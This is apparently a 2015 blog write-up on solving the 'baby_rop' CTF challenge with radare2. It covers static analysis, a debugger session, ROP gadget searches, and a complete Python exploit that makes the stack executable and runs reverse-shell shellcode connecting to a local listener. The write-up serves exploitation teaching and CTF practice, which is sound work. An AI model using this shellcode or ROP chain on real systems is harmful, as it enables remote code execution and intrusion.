+++
date = "2015-05-19T23:55:59+02:00"
draft = false
title = "Defeating baby_rop with radare2"
slug = "defeating-baby_rop-with-radare2"
aliases = [
	"defeating-baby_rop-with-radare2"
]
+++


In order to content the people that wanted something less hand-holding than [this]( http://dustri.org/b/exploiting-ezhp-pwn200-from-plaidctf-2014-with-radare2.html ) writeup which they say is too detailed and [this]( http://radare.today/using-radare2/ ) one not enough, we decided to write this blogpost: not too short, not too long, and about pwning!

The [binary]( http://bin.radare.today/baby_rop ) was a challenge (called `baby_rop`) from a small CTF that took place in France, called the [sthack]( https://www.sthack.fr/ ).

As always, if you don't get a command, append `?` to it to get documentation.

Ready? go!

```
$ r2 baby_rop
Warning: Cannot initialize dynamic section
 -- Experts agree, security holes suck, and we fixed some of them!
[0x08048e28]> ii
[Imports]

0 imports
```

No imports. A static binary?

```
[0x08048e28]> iI~static
static   true
[0x08048e28]> is~?
1982
```

Reversing the main function is left as an exercice to the reader;
it's a classic forking server, saying "Hello!", asking for a size and a string, and copying the data into it. What could possibly go wrong?

So, we just need to ROP our way into system, and that's it!

```
[0x08048e28]> is~system
vaddr=0x080d7a50 paddr=0x0008fa50 ord=084 fwd=NONE sz=20 bind=LOCAL type=OBJECT name=system_dirs
[0x08048e28]> is~exec
vaddr=0x080bd040 paddr=0x00075040 ord=908 fwd=NONE sz=2680 bind=LOCAL type=FUNC name=execute_stack_op
vaddr=0x080bdf10 paddr=0x00075f10 ord=911 fwd=NONE sz=2203 bind=LOCAL type=FUNC name=execute_cfa_program
vaddr=0x080ef1a8 paddr=0x000a71a8 ord=961 fwd=NONE sz=4 bind=GLOBAL type=OBJECT name=__have_o_cloexec
vaddr=0x080a53d0 paddr=0x0005d3d0 ord=1092 fwd=NONE sz=90 bind=GLOBAL type=FUNC name=_dl_make_stack_executable
vaddr=0x080eda14 paddr=0x000a5a14 ord=2141 fwd=NONE sz=4 bind=GLOBAL type=OBJECT name=_dl_make_stack_executable_hook
[0x08048e28]> 
```

Hoho, here is the trick! No *system* nor *execve*. It seems that we will have to craft a good old ROP chain, dup2 magic, write a `/bin/sh` string somewhere, to finally call `execve` on it.

Or, we can check what the `_dl_make_stack_executable` function does ;)

```
[0x08048e28]> pdf @ sym._dl_make_stack_executable
╒ (fcn) sym._dl_make_stack_executable 90
│          ;-- sym._dl_make_stack_executable:
│          0x080a53d0    53             push ebx
│          0x080a53d1    89c3           mov ebx, eax
│          0x080a53d3    83ec18         sub esp, 0x18
│          0x080a53d6    8b08           mov ecx, dword [eax]
│          0x080a53d8    a128da0e08     mov eax, dword [sym._dl_pagesize]  ; [0x80eda28:4]=0x1000  ; sym._dl_pagesize
│          0x080a53dd    89c2           mov edx, eax
│          0x080a53df    f7da           neg edx
│          0x080a53e1    21ca           and edx, ecx
│          0x080a53e3    3b0d64cf0e08   cmp ecx, dword [sym.__libc_stack_end]  ; [0x80ecf64:4]=0 ; sym.__libc_stack_end
│      ┌─< 0x080a53e9    752e           jne 0x80a5419           
│      │   0x080a53eb    8b0dc4cf0e08   mov ecx, dword [sym.__stack_prot]  ; [0x80ecfc4:4]=0x1000000  ; sym.__stack_prot
│      │   0x080a53f1    89442404       mov dword [esp + 4], eax    ; [0x4:4]=0x3010101 
│      │   0x080a53f5    891424         mov dword [esp], edx
│      │   0x080a53f8    894c2408       mov dword [esp + 8], ecx    ; [0x8:4]=0
│      │   0x080a53fc    e81fa9fcff     call sym.mprotect           ; sym.__waitpid+0x1b90
│      │      sym.__waitpid() ; sym.__mprotect
│      │   0x080a5401    85c0           test eax, eax
│     ┌──< 0x080a5403    751b           jne 0x80a5420         
│     ││   0x080a5405    c70300000000   mov dword [ebx], 0
│     ││   0x080a540b    31c0           xor eax, eax
│     ││   0x080a540d    830d18da0e08.  or dword [sym._dl_stack_flags], 1
│    ┌     ; JMP XREF from 0x080a541e (sym._dl_make_stack_executable)
│    ┌     ; JMP XREF from 0x080a5428 (sym._dl_make_stack_executable)
│    ┌───> 0x080a5414    83c418         add esp, 0x18
│    │││   0x080a5417    5b             pop ebx
│    │││   0x080a5418    c3             ret
│    ││└   ; JMP XREF from 0x080a53e9 (sym._dl_make_stack_executable)
│    ││└─> 0x080a5419    b801000000     mov eax, 1
│    └───< 0x080a541e    ebf4           jmp 0x80a5414       
│     └    ; JMP XREF from 0x080a5403 (sym._dl_make_stack_executable)
│     └──> 0x080a5420    b8d4ffffff     mov eax, 0xffffffd4    ; -44
│          0x080a5425    658b00         mov eax, dword gs:[eax]
╘          0x080a5428    ebea           jmp 0x80a5414               
[0x08048e28]>
```

Looks like a simple wrapper to mprotect, we just have to set `__stack_prot` to 7, and we've got a nice executable stack!

Time to figure how much we have to send to overwrite the *ret address*:

```
$ r2 -d rarun2 program=./baby_rop arg1=4444
Process with PID 3630 started...
PID = 3630
pid = 3630 tid = 3630
r_debug_select: 3630 3630
Using BADDR 0x400000
Asuming filepath /usr/local/bin/rarun2
bits 64
pid = 3630 tid = 3630
 -- Enable ascii-art jump lines in disassembly by setting 'e asm.lines=true'. asm.linesout and asm.linestyle may interest you as well
[0x7fdf3649ccd0]> e dbg.forks = true  # we want to "follow" forks
pid = 3630 tid = 3630
[0x7fdf3649ccd0]> dc
r_debug_select: 3630 1
[0x08048e28]> dc
[+] Socket created.
```

We can now launch our ghetto-client:

```
echo "1234`ragg2 -P 100 -r`" | nc 127.01 4444
```

Back to radare2:

```
[+] Listening on 4444.
[+] New client : 127.0.0.1
[0xf770ac10]> dp
Selected: 3630 1
 * 3630 s (current)
 - 3629 s (ppid)
 - 3633 s ./baby_rop
[0xf770ac10]> dpa 3633
pid = 3633 tid = 3633
r_debug_select: 3633 3633
[0xf770ac10]> dc
[+] SIGNAL 11 errno=0 addr=0x41574141 code=1 ret=0
r_debug_select: 3633 1
[+] signal 11 aka SIGSEGV received 0
[0x41574141]> dr=
 r15 0x00000000         r14 0x00000000         r13 0x00000000
 r12 0x00000000         rbp 0x56414155         rbx 0x41415441
 r11 0x00000000         r10 0x00000000          r9 0x00000000
  r8 0x00000000         rax 0xffffffff         rcx 0xffebd890
 rdx 0x00000065         rsi 0x080ed00c         rdi 0x08049b30
orax 0xffffffffffffffff rip 0x41574141         rflags = 1PSIV
 rsp 0xffebd920        
[0x41574141]> woO 0x41574141
64
[0x41574141]> 
```

So, our shellcode will look like this: `[an int][padding on 64 bits][payload]`.

Our payload will:

1. set the global variable `__stack_prot` to 7
	1. Set a register to `0xfffffff` (no NULL bytes)
	2. Increment it 8 times, to make it equal to 7
	3. Overwrite `__stack_prot` with it
2. call `_dl_make_stack_executable` on the stack
3. jump to `esp`

```
[0x08048e28]> e rop.len = 2
[0x08048e28]> e search.count = 2
[0x08048e28]> "/R/ pop ebx;ret"
  0x080481c5             5b  pop ebx
  0x080481c6             c3  ret

  0x0804d826             5b  pop ebx
  0x0804d827             c3  ret

[0x08048e28]> 
```

Without the first command, radare2 would have returned us things like `pop ebx; mov eax, 3; ret`; the second is because we just want one gadget with a second one in backup in case of a NULL byte in the offset.

The search command is fully quoted because `;` is used to chain r2 commands, and quoting the whole command instead of doing something else greatly simplify the parsing.

Because we're lazy, we'll use a regexp to find the other ones:

```
[0x08048e28]> "/R/ pop e[dca]x;ret"
  0x0806da92             5a  pop edx
  0x0806da93         c2fdff  ret 0xfffd

  0x08070f9c             5a  pop edx
  0x08070f9d             c3  ret

  0x08083ca3             59  pop ecx
  0x08083ca4             c3  ret

  0x080abee4             58  pop eax
  0x080abee5             cb  retf

  0x080bf3b6             58  pop eax
  0x080bf3b7             c3  ret

  0x080dcabf             5a  pop edx
  0x080dcac0             cb  retf

  0x080dd55f             58  pop eax
  0x080dd560             cb  retf

  0x080dda1a             59  pop ecx
  0x080dda1b             cf  iretd

  0x080e799e             58  pop eax
  0x080e799f             c3  ret

  0x080e8d98             58  pop eax
  0x080e8d99             c3  ret

  0x080ea630             58  pop eax
  0x080ea631         c20000  ret 0

  0x080eae30             58  pop eax
  0x080eae31             ca0000  retf 0

  0x080eb330             58  pop eax
  0x080eb331             cf  iretd

[0x08048e28]>
```

Looking for the other required one is left as an exercice for the reader.

Here is our full exploit:

```
#!/usr/bin/python

import struct
import socket

# Reverse shell on localhost:1337
shellcode = (b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80"
             b"\x92\xb0\x66\x68"
             b"\x7f\x01\x01\x01" # ip addr
             b"\x66\x68"
             b"\x05\x39" # port
             b"\x43\x66\x53\x89"
             b"\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0"
             b"\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73"
             b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80");

def rop(*args):
        return struct.pack('I'*len(args), *args)


s = socket.create_connection(('localhost', 5555))

s.recv(1337)

payload = rop(1337) + 'A' * 64  # padding

# set __stack_prot to 7
payload += rop(
    0x08070f9c, # pop edx; ret;
    0x080ecfc4, # __stack_prot
    0x08083ca3, # pop ecx; ret;
    0xffffffff, # -1
    )
for i in range(0, 8):
    payload += rop(0x080de4ee) # inc ecx; ret; 8 times
payload += rop(0x080e5efa) # add dword ptr [edx], ecx

# make our stack executable, and jump to the shellcode
payload += rop(
    0x080bf3b6,  # pop eax; ret;
    0x080ecf64,  # _libc_stack_end
    0x080a53d0,  # _dl_make_stack_executable
    0x080c4bb3   # call esp
    )

payload += shellcode

s.send(payload + '\n')
```

And now, feel free to check what every command does by appending `?` to it, and try to recreate this exploit from scratch ;)
